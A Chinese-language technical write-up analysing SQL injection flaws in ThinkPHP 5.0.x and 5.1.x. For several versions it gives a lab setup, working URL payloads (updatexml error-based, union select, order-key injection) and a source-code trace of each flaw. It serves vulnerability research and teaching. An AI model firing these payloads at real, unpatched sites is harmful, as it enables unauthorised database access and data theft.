[ThinkPHP框架 5.0.x sql注入漏洞分析](https://xz.aliyun.com/t/2257)

[TP5漏洞分析SQL注入篇](https://hosch3n.github.io/2020/10/21/TP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90SQL%E6%B3%A8%E5%85%A5%E7%AF%87/)

[Mochazz/ThinkPHP-Vuln](https://github.com/Mochazz/ThinkPHP-Vuln)

# 路由解析

路由解析将URL地址解析到某个模块中的某个控制器下的某个方法

```
http://server/module/controller/action/param/value/
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071412367.png)

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        return '<style type="text/css">*{ padding: 0; margin: 0; } .think_default_text{ padding: 4px 48px;} a{color:#2E5CD5;cursor: pointer;text-decoration: none} a:hover{text-decoration:underline; } body{ background: #fff; font-family: "Century Gothic","Microsoft yahei"; color: #333;font-size:18px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.6em; font-size: 42px }</style><div style="padding: 24px 48px;"> <h1>:)</h1><p> ThinkPHP V5<br/><span style="font-size:30px">十年磨一剑 - 为API开发设计的高性能框架</span></p><span style="font-size:22px;">[ V5.0 版本由 <a href="http://www.qiniu.com" target="qiniu">七牛云</a> 独家赞助发布 ]</span></div><script type="text/javascript" src="http://tajs.qq.com/stats?sId=9347272" charset="UTF-8"></script><script type="text/javascript" src="http://ad.topthink.com/Public/static/client.js"></script><thinkad id="ad_bd568ce7058a1091"></thinkad>';
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071434033.png)

```php
<?php

namespace app\index\controller;

class Index
{
    public function index()
    {
        return "index";
    }

    public function hello($str = "world")
    {
        print("hello $str");
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071438229.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071439472.png)

---

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071449547.png)

```php
<?php

namespace app\hello\controller;

class Index
{
    public function index()
    {
        return "Hello";
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071450657.png)

---

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071454426.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071454881.png)

# 变量获取

[https://www.kancloud.cn/manual/thinkphp5/118044](https://www.kancloud.cn/manual/thinkphp5/118044)

>变量类型方法('变量名/变量修饰符','默认值','过滤方法')
>
>框架默认没有设置任何过滤规则

助手函数

```php
    /**
     * 获取输入数据 支持默认值和过滤
     * @param string    $key 获取的变量名
     * @param mixed     $default 默认值
     * @param string    $filter 过滤方法
     * @return mixed
     */
    function input($key = '', $default = null, $filter = '')
    {
        if (0 === strpos($key, '?')) {
            $key = substr($key, 1);
            $has = true;
        }
        if ($pos = strpos($key, '.')) {
            // 指定参数来源
            list($method, $key) = explode('.', $key, 2);
            if (!in_array($method, ['get', 'post', 'put', 'patch', 'delete', 'route', 'param', 'request', 'session', 'cookie', 'server', 'env', 'path', 'file'])) {
                $key    = $method . '.' . $key;
                $method = 'param';
            }
        } else {
            // 默认为自动判断
            $method = 'param';
        }
        if (isset($has)) {
            return request()->has($key, $method, $default);
        } else {
            return request()->$method($key, $default, $filter);
        }
    }
```

```php
<?php

namespace app\index\controller;

class Index
{
    public function index()
    {
        $a=input('get.id');
        var_dump($a);
        $get=input('get.');
        var_dump($get);
    }
}
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071548200.png)

ThinkPHP5.0版本默认的变量修饰符是`/s`,如果需要传入字符串之外的变量可以使用下面的修饰符,包括

|修饰符|作用|
|:---:|:---:|
|s|强制转换为字符串类型|
|d|强制转换为整型类型|
|b|强制转换为布尔类型|
|a|强制转换为数组类型|
|f|强制转换为浮点类型|

>如果你要获取的数据为数组,请一定注意要加上`/a`修饰符才能正确获取到

# 5.0.14版本sql注入

[ThinkPHP 5.0.14](http://www.thinkphp.cn/download/1107.html)

## 数据库配置

```
create table users(id int auto_increment primary key,username varchar(20),password varchar(30));
insert into users(username,password) values("user","password");
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071559929.png)

`applicaion/database.php`

```php
<?php

return [
    // 数据库类型
    'type'            => 'mysql',
    // 服务器地址
    'hostname'        => '127.0.0.1',
    // 数据库名
    'database'        => 'thinkphp_v5',
    // 用户名
    'username'        => 'thinkphp_v5',
    // 密码
    'password'        => 'thinkphp_v5',
    // 端口
    'hostport'        => '3306',
```

同时在`application/config.php`中开启`debug`模式(`'app_debug' => true`),否则报错注入没有回显

## 漏洞复现

```php
<?php
namespace app\index\controller;
use think\Db;

class Index
{
    public function index()
    {
        $username = input('get.username/a');
        Db::table("users")->where(["id"=>1])->insert(["username"=>$username]);
    }
}
```

`index.php?username[0]=inc&username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&username[2]=1`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071635736.png)

## 漏洞分析

```php
#thinkphp/library/think/db/Query.php
    /**
     * 插入记录
     * @access public
     * @param mixed   $data         数据
     * @param boolean $replace      是否replace
     * @param boolean $getLastInsID 返回自增主键
     * @param string  $sequence     自增序列名
     * @return integer|string
     */
    public function insert(array $data = [], $replace = false, $getLastInsID = false, $sequence = null)
    {
        // 分析查询表达式
        $options = $this->parseExpress();//分析表达式
        $data    = array_merge($options['data'], $data);
        // 生成SQL语句
        $sql = $this->builder->insert($data, $options, $replace);
        // 获取参数绑定
        $bind = $this->getBind();
        if ($options['fetch_sql']) {
            // 获取实际执行的SQL语句
            return $this->connection->getRealSql($sql, $bind);
        }

        // 执行操作
        $result = 0 === $sql ? 0 : $this->execute($sql, $bind);
        ...
    }
```

```php
#thinkphp/library/think/db/Builder.php
    /**
     * 生成insert SQL
     * @access public
     * @param array     $data 数据
     * @param array     $options 表达式
     * @param bool      $replace 是否replace
     * @return string
     */
    public function insert(array $data, $options = [], $replace = false)
    {
        // 分析并处理数据
        $data = $this->parseData($data, $options);
        if (empty($data)) {
            return 0;
        }
        $fields = array_keys($data);
        $values = array_values($data);

        $sql = str_replace(
            ['%INSERT%', '%TABLE%', '%FIELD%', '%DATA%', '%COMMENT%'],
            [
                $replace ? 'REPLACE' : 'INSERT',
                $this->parseTable($options['table'], $options),
                implode(' , ', $fields),
                implode(' , ', $values),
                $this->parseComment($options['comment']),
            ], $this->insertSql);

        return $sql;
    }

    /**
     * 数据分析
     * @access protected
     * @param array     $data 数据
     * @param array     $options 查询参数
     * @return array
     * @throws Exception
     */
    protected function parseData($data, $options)
    {
        if (empty($data)) {
            return [];
        }

        // 获取绑定信息
        $bind = $this->query->getFieldsBind($options['table']);
        if ('*' == $options['field']) {
            $fields = array_keys($bind);
        } else {
            $fields = $options['field'];
        }

        $result = [];
        foreach ($data as $key => $val) {
            $item = $this->parseKey($key, $options);#字段和表名处理 对payload利用没有实际影响
            ...
            if (false === strpos($key, '.') && !in_array($key, $fields, true)) {
                ...
            } elseif (is_null($val)) {
                $result[$item] = 'NULL';
            } elseif (is_array($val) && !empty($val)) {
                switch ($val[0]) {#关键点
                    case 'exp':
                        $result[$item] = $val[1];
                        break;
                    case 'inc':
                        $result[$item] = $this->parseKey($val[1]) . '+' . floatval($val[2]);
                        #result[`username`]=updatexml(1,concat(0x7e,user(),0x7e),1)+1
                        break;
                    case 'dec':
                        $result[$item] = $this->parseKey($val[1]) . '-' . floatval($val[2]);
                        break;
                }
            }
            ...
        }
        return $result;
    }
```

最终执行的sql语句为

```
INSERT INTO `users` (`username`) VALUES (updatexml(1,concat(0x7e,user(),0x7e),1)+1)
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071901818.png)

>添加`username[2]=1`的原因

语句拼接时用到了`floatval($val[2])`,因此需要设置`username[2]`

>不使用`exp`的原因

前面在`input`处理时给`exp`后面加了个空格,类似于thinkphp_v3的处理方式

```php
#thinkphp/library/think/Request.php
    /**
     * 过滤表单中的表达式
     * @param string $value
     * @return void
     */
    public function filterExp(&$value)
    {
        // 过滤查询特殊字符
        if (is_string($value) && preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i', $value)) {
            $value .= ' ';
        }
        // TODO 其他安全过滤
    }
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204071917159.png)

>不使用`concat(0x7e,(select user()),0x7e)`的原因

会报错`SQLSTATE[HY000]: General error: 1105 Only constant XPATH queries are supported`

可以用其他报错方式来带出数据,取决于数据库版本

`index.php?username[0]=inc&username[1]=ST_LongFromGeoHash((select*from(select*from(select @@version)x)y))&username[2]=1`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204072029966.png)

# 5.1.6版本sql注入

## 漏洞复现

```php
<?php
namespace app\index\controller;
use think\Db;

class Index
{
    public function index()
    {
        $username = input('get.username/a');
        Db::table("users")->where(["id"=>1])->insert(["username"=>$username]);
    }
}
```

`index.php?username[0]=point&username[1]=a&username[2]='b' and updatexml(1,concat(0x7e,user(),0x7e),1))--+`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204092348625.png)

## 漏洞分析

主要是`parseData`的处理方式跟前面的`5.0.14`版本不一样

```php
#thinkphp/library/think/db/Builder.php
    /**
     * 数据分析
     * @access protected
     * @param  Query     $query     查询对象
     * @param  array     $data      数据
     * @param  array     $fields    字段信息
     * @param  array     $bind      参数绑定
     * @param  string    $suffix    参数绑定后缀
     * @return array
     */
    protected function parseData(Query $query, $data = [], $fields = [], $bind = [], $suffix = '')
    {
        ...

        $result = [];

        foreach ($data as $key => $val) {
            $item = $this->parseKey($query, $key);#return $key;

           ...

            if (false !== strpos($key, '->')) {
                list($key, $name) = explode('->', $key);
                $item             = $this->parseKey($query, $key);
                $result[$item]    = 'json_set(' . $item . ', \'$.' . $name . '\', ' . $this->parseDataBind($query, $key, $val, $bind, $suffix) . ')';
            } elseif (false === strpos($key, '.') && !in_array($key, $fields, true)) {
                if ($options['strict']) {
                    throw new Exception('fields not exists:[' . $key . ']');
                }
            } elseif (is_null($val)) {
                $result[$item] = 'NULL';
            } elseif (is_array($val) && !empty($val)) {
                switch ($val[0]) {
                    case 'INC':
                        $result[$item] = $item . ' + ' . floatval($val[1]);
                        break;
                    case 'DEC':
                        $result[$item] = $item . ' - ' . floatval($val[1]);
                        break;
                    default:
                        $value = $this->parseArrayData($query, $val);#关键点
                        if ($value) {
                            $result[$item] = $value;
                        }
                }
            } elseif (is_scalar($val)) {
                // 过滤非标量数据
                $result[$item] = $this->parseDataBind($query, $key, $val, $bind, $suffix);
            }
        }

        return $result;
    }

#thinkphp/library/think/db/builder/Mysql.php
    /**
     * 数组数据解析
     * @access protected
     * @param  Query     $query     查询对象
     * @param  array     $data
     * @return mixed
     */
    protected function parseArrayData(Query $query, $data)
    {
        list($type, $value) = $data;#$type=$data[0],$value=$data[1]

        switch (strtolower($type)) {#当type(即$data[1])为point时,$result由$fun(即$data[2]),$point(即$data[3]),$value(即$data[1])构成
            case 'point':
                $fun   = isset($data[2]) ? $data[2] : 'GeomFromText';
                $point = isset($data[3]) ? $data[3] : 'POINT';
                if (is_array($value)) {
                    $value = implode(' ', $value);
                }
                $result = $fun . '(\'' . $point . '(' . $value . ')\')';
                break;
            default:
                $result = false;
        }

        return $result;
    }
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101417411.png)

最终得到的result为`'b' and updatexml(1,concat(0x7e,user(),0x7e),1))-- ('POINT(a)')`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101419689.png)

最终执行的sql语句为

```
INSERT INTO `users` (`username`) VALUES ('b' and updatexml(1,concat(0x7e,user(),0x7e),1))-- ('POINT(a)')) 
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101422994.png)

>除了使用`insert`方法外,还可以使用`insertAll`和`update`方法

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101427347.png)

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101427972.png)

# 5.0.10版本sql注入

## 漏洞复现

```php
<?php
namespace app\index\controller;
use think\Db;

class Index
{
    public function index()
    {
        $username = input('get.username/a');
        $result=Db::table("users")->where(['username' => $username])->select();
        var_dump($result);
    }
}
```

`?username[0]=not like&username[1][0]=asdf&username[1][1]=asdf&username[2]=) union select 1,user(),3--+`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101953596.png)

## 漏洞分析

函数调用栈

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204101958003.png)

```php
#thinkphp/library/think/db/Builder.php
    // where子单元分析
    protected function parseWhereItem($field, $val, $rule = '', $options = [], $binds = [], $bindName = null)
    {
        // 字段分析
        $key = $field ? $this->parseKey($field, $options) : '';#return $key;

        // 查询规则和条件
        if (!is_array($val)) {
            $val = ['=', $val];
        }
        list($exp, $value) = $val;#$value为$val[1]

        ...

        // 检测操作符
        if (!in_array($exp, $this->exp)) {
            $exp = strtolower($exp);
            if (isset($this->exp[$exp])) {
                $exp = $this->exp[$exp];
            } else {
                throw new Exception('where express error:' . $exp);
            }
        }
        $bindName = $bindName ?: 'where_' . str_replace(['.', '-'], '_', $field);#$bindName="where_username"

        ...

        $whereStr = '';
        if (in_array($exp, ['=', '<>', '>', '>=', '<', '<='])) {
            ...
        } elseif ('LIKE' == $exp || 'NOT LIKE' == $exp) {
            // 模糊匹配
            if (is_array($value)) {#关键点
            #当$val[1]为array时进入foreach,此时$logic的值取决于$val[2]
            #因为$logic的值可被用户控制,由此造成sql注入
                foreach ($value as $item) {
                    $array[] = $key . ' ' . $exp . ' ' . $this->parseValue($item, $field);
                }
                $logic = isset($val[2]) ? $val[2] : 'AND';
                $whereStr .= '(' . implode($array, ' ' . strtoupper($logic) . ' ') . ')';
            } else {
                $whereStr .= $key . ' ' . $exp . ' ' . $this->parseValue($value, $field);
            }
        }
        ...
        return $whereStr;
    }

    /**
     * value分析
     * @access protected
     * @param mixed     $value
     * @param string    $field
     * @return string|array
     */
    protected function parseValue($value, $field = '')
    {
        if (is_string($value)) {
            $value = strpos($value, ':') === 0 && $this->query->isBind(substr($value, 1)) ? $value : $this->connection->quote($value);
        }
        #strpos($value, ':') === 0 为false,因此执行$this->connection->quote($value)
        ...
        return $value;
    }

#thinkphp/library/think/db/Connection.php
    /**
     * SQL指令安全过滤
     * @access public
     * @param string $str SQL字符串
     * @param bool   $master 是否主库查询
     * @return string
     */
    public function quote($str, $master = true)
    {
        $this->initConnect($master);
        return $this->linkID ? $this->linkID->quote($str) : $str;
        #https://www.php.net/manual/zh/pdo.quote.php
        #为输入的字符串添加引号（如果有需要），并对特殊字符进行转义
    }
```

由于存在`implode($array, ' ' . strtoupper($logic)`,因此对于`$array`的长度有要求

```php
<?php

$array[0]="asdf";
$logic="test";
$a=implode($array,' '.strtoupper($logic).' ');
var_dump($a);
```

```
string(4) "asdf"
```

```php
<?php

$array[0]="asdf";
$array[1]="asdf";
$logic="test";
$a=implode($array,' '.strtoupper($logic).' ');
var_dump($a);
```

```
string(14) "asdf TEST asdf"
```

>注意遗留写法与当前写法的区别

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102024249.png)

---

原始输入为`username[0]=not like&username[1][0]=asdf&username[1][1]=asdf&username[2]=) union select 1,user(),3--+`

`parseWhereItem`中`$field`为`"username"`,`$val`为`username`数组

经过`list($exp, $value) = $val;`后得到`$exp="not like"`,`$value`为`username[1]`这一数组

经过操作符检测`$exp = $this->exp[$exp];`后`$exp`转化为`NOT LIKE`

在`NOT LIKE`的模糊匹配中,经过`foreach`后得到的`$array`为

```
1 = {} "`username` NOT LIKE 'asdf'"
0 = {} "`username` NOT LIKE 'asdf'"
```

`implode($array, ' ' . strtoupper($logic) . ' ')`后得到的字符串为

```
`username` NOT LIKE 'asdf' ) UNION SELECT 1,USER(),3--  `username` NOT LIKE 'asdf'
```

最终的查询语句为

```
SELECT * FROM `users` WHERE  (`username` NOT LIKE 'asdf' ) UNION SELECT 1,USER(),3--  `username` NOT LIKE 'asdf') 
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102037271.png)

## 漏洞产生原因

```php
#thinkphp/library/think/Request.php
    /**
     * 过滤表单中的表达式
     * @param string $value
     * @return void
     */
    public function filterExp(&$value)
    {
        // 过滤查询特殊字符
        if (is_string($value) && preg_match('/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i', $value)) {
            $value .= ' ';
        }
        // TODO 其他安全过滤
    }
```

可以看到在`filterExp`中仅对`NOTLIKE`进行了处理,没有处理`NOT LIKE`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102043480.png)

# 5.1.17版本sql注入

## 漏洞复现

```php
<?php
namespace app\index\controller;

class Index
{
    public function index()
    {
        $order = request()->get('order');
        $result = db('users')->where(['username' => 'user'])->order($order)->find();
        var_dump($result);
    }
}
```

`?order[id` and updatexml(1,concat(0x7e,user(),0x7e),1)%23]=1`

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102145690.png)

## 漏洞分析

函数调用栈

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102227636.png)

```php
#Query->find => Connection->find => Builder->select
#thinkphp/library/think/db/Builder.php
    /**
     * 生成查询SQL
     * @access public
     * @param  Query  $query  查询对象
     * @return string
     */
    public function select(Query $query)#Builder->select
    {
        $options = $query->getOptions();

        return str_replace(
            ['%TABLE%', '%DISTINCT%', '%FIELD%', '%JOIN%', '%WHERE%', '%GROUP%', '%HAVING%', '%ORDER%', '%LIMIT%', '%UNION%', '%LOCK%', '%COMMENT%', '%FORCE%'],
            [
                $this->parseTable($query, $options['table']),
                $this->parseDistinct($query, $options['distinct']),
                $this->parseField($query, $options['field']),
                $this->parseJoin($query, $options['join']),
                $this->parseWhere($query, $options['where']),
                $this->parseGroup($query, $options['group']),
                $this->parseHaving($query, $options['having']),
                $this->parseOrder($query, $options['order']),#关键点
                $this->parseLimit($query, $options['limit']),
                $this->parseUnion($query, $options['union']),
                $this->parseLock($query, $options['lock']),
                $this->parseComment($query, $options['comment']),
                $this->parseForce($query, $options['force']),
            ],
            $this->selectSql);
    }

    /**
     * order分析
     * @access protected
     * @param  Query     $query        查询对象
     * @param  mixed     $order
     * @return string
     */
    protected function parseOrder(Query $query, $order)
    {
        if (empty($order)) {
            return '';
        }

        $array = [];

        foreach ($order as $key => $val) {
            if ($val instanceof Expression) {
                ...
            } else {
                $array[] = $this->parseKey($query, $key, true) . $sort;#$sort=""
            }
        }

        return ' ORDER BY ' . implode(',', $array);
    }

#thinkphp/library/think/db/builder/Mysql.php
    /**
     * 字段和表名处理
     * @access public
     * @param  Query     $query 查询对象
     * @param  mixed     $key   字段名
     * @param  bool      $strict   严格检测
     * @return string
     */
    public function parseKey(Query $query, $key, $strict = false)
    {
        ...
        #$array[] = $this->parseKey($query, $key, true) . $sort;
        #$strict为true
        if ('*' != $key && ($strict || !preg_match('/[,\'\"\*\(\)`.\s]/', $key))) {
            $key = '`' . $key . '`';
            #$key=`id` and updatexml(1,concat(0x7e,user(),0x7e),1)#`
        }

        ...

        return $key;
    }
```

在parseOrder分析时的`$order`为

```
order[id` and updatexml(1,concat(0x7e,user(),0x7e),1)%23]=1
```

传递到`parseKey`中进行处理

```
$key=id` and updatexml(1,concat(0x7e,user(),0x7e),1)#
```

处理后得到

```
$key=`id` and updatexml(1,concat(0x7e,user(),0x7e),1)#`
```

生成的查询SQL为

```
SELECT * FROM `users` WHERE  `username` = :where_AND_username ORDER BY `id` and updatexml(1,concat(0x7e,user(),0x7e),1)#` LIMIT 1  
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102225207.png)

最终的SQL语句为

```
SELECT * FROM `users` WHERE `username` = 'user' ORDER BY `id` and updatexml(1,concat(0x7e,user(),0x7e),1)-- ` LIMIT 1
```

![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202204102225852.png)